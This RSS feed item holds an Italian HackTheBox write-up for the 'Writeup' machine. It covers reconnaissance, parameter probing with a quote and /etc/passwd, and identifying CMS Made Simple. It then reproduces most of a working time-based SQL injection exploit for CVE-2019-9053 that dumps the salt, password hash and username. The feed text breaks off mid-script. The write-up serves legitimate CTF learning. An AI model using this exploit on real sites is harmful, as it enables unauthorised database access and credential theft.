<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>ctf hackthebox machine sqlinjection on SE</title>
    <link>https://samirettali.com/categories/ctf-hackthebox-machine-sqlinjection/</link>
    <description>Recent content in ctf hackthebox machine sqlinjection on SE</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 15 Jul 2019 01:04:41 +0200</lastBuildDate>
    
        <atom:link href="https://samirettali.com/categories/ctf-hackthebox-machine-sqlinjection/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Writeup - HackTheBox</title>
      <link>https://samirettali.com/posts/2019-07-05-writeup/</link>
      <pubDate>Mon, 15 Jul 2019 01:04:41 +0200</pubDate>
      
      <guid>https://samirettali.com/posts/2019-07-05-writeup/</guid>
      <description>

&lt;p&gt;Writeup è una macchina Linux su HackTheBox da 20 punti.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://samirettali.com/images/htb-writeup/writeup.png&#34; alt=&#34;Writeup&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Iniziamo con un rapido scan delle porte:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://samirettali.com/images/htb-writeup/nmap.png&#34; alt=&#34;Writeup&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Notiamo che c&amp;rsquo;è un web server in esecuzione sulla macchina, visitiamolo:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/writeup-web.png&#34; alt=&#34;Pagina web&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Il codice sorgente non contiene niente di interessante, visitiamo la directory
&lt;code&gt;/writeup&lt;/code&gt; contenuta nel risultato dello scan di nmap:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/writeup-dir.png&#34; alt=&#34;Writeup directory&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I link nella pagina portano ai seguenti URL:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;http://10.10.10.138/writeup/index.php?page=ypuffy
http://10.10.10.138/writeup/index.php?page=blue
http://10.10.10.138/writeup/index.php?page=writeup&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;che contengono solamente del testo.&lt;/p&gt;

&lt;p&gt;Proviamo allora a lavorare sul parametro page. Inserendo come valore del
parametro un&amp;rsquo;apice&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;http://10.10.10.138/writeup/index.php?page=&amp;#39;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;otteniamo una pagina 404 come risposta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://samirettali.com/images/htb-writeup/404.png&#34; alt=&#34;404&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Provando con&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;http://10.10.10.138/writeup/index.php?page=/etc/passwd&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;otteniamo lo stesso risultato.&lt;/p&gt;

&lt;p&gt;Facciamo un passo indietro e vediamo se
&lt;a href=&#34;https://samirettali.com/images/htb-writeup/https://www.wappalyzer.com/&#34;&gt;Wappalyzer&lt;/a&gt; (possiamo usare il plugin da browser)
ci dà qualche informazione in più. Scopriamo infatti che questa parte di sito è
realizzata tramite CMS Made Simple.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://samirettali.com/images/htb-writeup/wappalyzer.png&#34; alt=&#34;Wappalyzer&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Facendo una ricerca su internet troviamo che CMS Made Simple è vulnerabile a SQL
Injection. Vediamo il codice dell&amp;rsquo;exploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple &amp;lt;= 2.2.9&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Date: 30-03-2019&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Exploit Author: Daniele Scanu @ Certimeter Group&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Vendor Homepage: https://www.cmsmadesimple.org/&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Version: &amp;lt;= 2.2.9&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Tested on: Ubuntu 18.04 LTS&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# CVE : CVE-2019-9053&lt;/span&gt;

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;requests&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;termcolor&lt;/span&gt; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; colored
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;time&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;termcolor&lt;/span&gt; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; cprint
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;optparse&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#00f;font-weight:bold&#34;&gt;hashlib&lt;/span&gt;

parser &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; optparse&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;OptionParser()
parser&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;add_option(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;-u&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;--url&amp;#39;&lt;/span&gt;, action&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;store&amp;#34;&lt;/span&gt;, dest&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;, help&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Base target uri (ex. http://10.10.10.100/cms)&amp;#34;&lt;/span&gt;)
parser&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;add_option(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;-w&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;--wordlist&amp;#39;&lt;/span&gt;, action&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;store&amp;#34;&lt;/span&gt;, dest&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;wordlist&amp;#34;&lt;/span&gt;, help&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Wordlist for crack admin password&amp;#34;&lt;/span&gt;)
parser&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;add_option(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;-c&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;--crack&amp;#39;&lt;/span&gt;, action&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;store_true&amp;#34;&lt;/span&gt;, dest&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;cracking&amp;#34;&lt;/span&gt;, help&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Crack password with wordlist&amp;#34;&lt;/span&gt;, default&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;False)

options, args &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; parser&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;parse_args()
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;not&lt;/span&gt; options&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;url:
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[+] Specify an url target&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[+] Example usage (no cracking password): exploit.py -u http://target-uri&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#008000&#34;&gt;exit&lt;/span&gt;()

url_vuln &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; options&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;url &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;/moduleinterface.php?mact=News,m1_,default,0&amp;#39;&lt;/span&gt;
session &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;Session()
dictionary &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$&amp;#39;&lt;/span&gt;
flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True
password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
temp_password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
TIME &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;
db_name &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
output &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
email &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
wordlist &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; options&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;wordlist:
    wordlist &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; options&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;wordlist

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;crack_password&lt;/span&gt;():
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; password
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; output
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; wordlist
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; salt
    &lt;span style=&#34;color:#008000&#34;&gt;dict&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;open&lt;/span&gt;(wordlist)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; line &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;dict&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;readlines():
        line &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
        beautify_print_try(line)
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; hashlib&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;md5(&lt;span style=&#34;color:#008000&#34;&gt;str&lt;/span&gt;(salt) &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; line)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;hexdigest() &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; password:
            output &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;[+] Password cracked: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; line
            &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#008000&#34;&gt;dict&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;close()

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;beautify_print_try&lt;/span&gt;(value):
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; output
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c&amp;#34;&lt;/span&gt;
    cprint(output,&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, attrs&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;])
    cprint(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;[*] Try: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; value, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, attrs&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;])

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;beautify_print&lt;/span&gt;():
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; output
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\033&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c&amp;#34;&lt;/span&gt;
    cprint(output,&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, attrs&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;])

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;dump_salt&lt;/span&gt;():
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; flag
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; salt
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; output
    ord_salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    ord_salt_temp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;while&lt;/span&gt; flag:
        flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; False
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#008000&#34;&gt;len&lt;/span&gt;(dictionary)):
            temp_salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; salt &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; dictionary[i]
            ord_salt_temp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ord_salt &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;hex&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(dictionary[i]))[&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;:]
            beautify_print_try(temp_salt)
            payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;a,b,1,5))+and+(select+sleep(&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;str&lt;/span&gt;(TIME) &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;)+from+cms_siteprefs+where+sitepref_value+like+0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; ord_salt_temp &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;25+and+sitepref_name+like+0x736974656d61736b)+--+&amp;#34;&lt;/span&gt;
            url &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; url_vuln &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;amp;m1_idlist=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; payload
            start_time &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;time()
            r &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;get(url)
            elapsed_time &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;time() &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; start_time
            &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; elapsed_time &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;=&lt;/span&gt; TIME:
                flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True
                &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; flag:
            salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; temp_salt
            ord_salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ord_salt_temp
    flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True
    output &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;[+] Salt for password found: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; salt

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;dump_password&lt;/span&gt;():
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; flag
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; password
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; output
    ord_password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    ord_password_temp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;while&lt;/span&gt; flag:
        flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; False
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#008000&#34;&gt;len&lt;/span&gt;(dictionary)):
            temp_password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; password &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; dictionary[i]
            ord_password_temp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ord_password &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;hex&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(dictionary[i]))[&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;:]
            beautify_print_try(temp_password)
            payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;a,b,1,5))+and+(select+sleep(&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;str&lt;/span&gt;(TIME) &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;)+from+cms_users&amp;#34;&lt;/span&gt;
            payload &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;+where+password+like+0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; ord_password_temp &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;25+and+user_id+like+0x31)+--+&amp;#34;&lt;/span&gt;
            url &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; url_vuln &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;amp;m1_idlist=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; payload
            start_time &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;time()
            r &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;get(url)
            elapsed_time &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;time() &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; start_time
            &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; elapsed_time &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;=&lt;/span&gt; TIME:
                flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True
                &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; flag:
            password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; temp_password
            ord_password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ord_password_temp
    flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True
    output &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;[+] Password found: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; password

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;dump_username&lt;/span&gt;():
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; flag
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; db_name
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; output
    ord_db_name &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    ord_db_name_temp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;while&lt;/span&gt; flag:
        flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; False
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#008000&#34;&gt;len&lt;/span&gt;(dictionary)):
            temp_db_name &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; db_name &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; dictionary[i]
